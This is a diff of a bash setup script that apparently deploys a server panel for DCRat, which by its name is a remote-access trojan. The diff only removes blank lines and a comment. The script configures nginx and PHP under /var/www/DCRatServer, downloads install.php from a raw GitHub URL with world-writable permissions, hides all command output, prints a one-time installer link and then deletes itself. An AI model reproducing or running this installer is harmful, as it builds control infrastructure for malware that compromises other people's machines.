@@ -4,7 +4,6 @@ if [[ "$os_version" != "20.04" ]]; then
     echo "Need Ubuntu 20.04. Now running version $os_version."
     exit 1
 fi
-
 while [[ $# -gt 0 ]]; do
     case $1 in
         -d|--domain)
@@ -16,17 +15,14 @@ while [[ $# -gt 0 ]]; do
             ;;
     esac
 done
-
 log_progress() {
     timestamp=$(date +"%H:%M")
     elapsed_time=$(( SECONDS - start_time ))
     printf "[%02d:%02d] %s\n" $((elapsed_time/60)) $((elapsed_time%60)) "$1"
 }
-
 log() {
     printf "%s\n" "$1"
 }
-
 clear
 echo "Preparing the system..."
 sudo apt update -y > /dev/null 2>&1 && sudo apt upgrade -y > /dev/null 2>&1
@@ -65,12 +61,10 @@ sudo chown -R www-data:www-data /var/www/DCRatServer > /dev/null 2>&1
 sudo chmod -R 755 /var/www/DCRatServer > /dev/null 2>&1
 sudo touch /var/www/DCRatServer/index.html > /dev/null 2>&1
 sleep 1
-
 server_ip=$(hostname -I | awk '{print $1}')
 if [ -z "$domain" ]; then
     domain="$server_ip"
 fi
-
 config_file="/etc/nginx/sites-available/DCRatServer"
 sudo tee "$config_file" > /dev/null << EOL
 server {
@@ -100,7 +94,6 @@ server {
     }
 }
 EOL
-
 sudo ln -sf "$config_file" /etc/nginx/sites-enabled/ > /dev/null 2>&1
 sleep 1
 sudo nginx -t > /dev/null 2>&1
@@ -108,7 +101,6 @@ sleep 1
 sudo systemctl restart nginx > /dev/null 2>&1
 sudo systemctl restart php7.4-fpm > /dev/null 2>&1
 sleep 1
-
 sudo tee /etc/php/7.4/fpm/conf.d/DCRatServer.ini > /dev/null << 'EOL'
 memory_limit = 800M
 max_execution_time = 60
@@ -117,11 +109,8 @@ upload_max_filesize = 9000000M
 max_input_time = 60
 max_input_vars = 1000
 EOL
-
 sleep 1
 sudo systemctl restart php7.4-fpm > /dev/null 2>&1
-
-# Создание папки DCRatServer и установка файлов
 nested_path="/var/www/DCRatServer"
 sudo rm -rf "$nested_path" > /dev/null 2>&1
 sudo mkdir -p "$nested_path" > /dev/null 2>&1
@@ -131,11 +120,9 @@ sudo touch "$nested_path/index.html"
 sudo curl -fsSL https://raw.githubusercontent.com/yma-Lib/Cht-Lib/refs/heads/main/install.php -o "$nested_path/install.php" > /dev/null 2>&1
 sudo chmod 777 "$nested_path/install.php" > /dev/null 2>&1
 sleep 3
-
 elapsed_time=$(( SECONDS - start_time ))
 log "✅ Installation and configuration successfully completed in $(printf '%02d:%02d' $((elapsed_time/60)) $((elapsed_time%60)))!"
 log "🔗 Link to the installer: http://$domain/install.php"
 log "❕ Link can only be used once."
-
 sudo rm -- "$0" > /dev/null 2>&1
 sudo rm install.php > /dev/null 2>&1
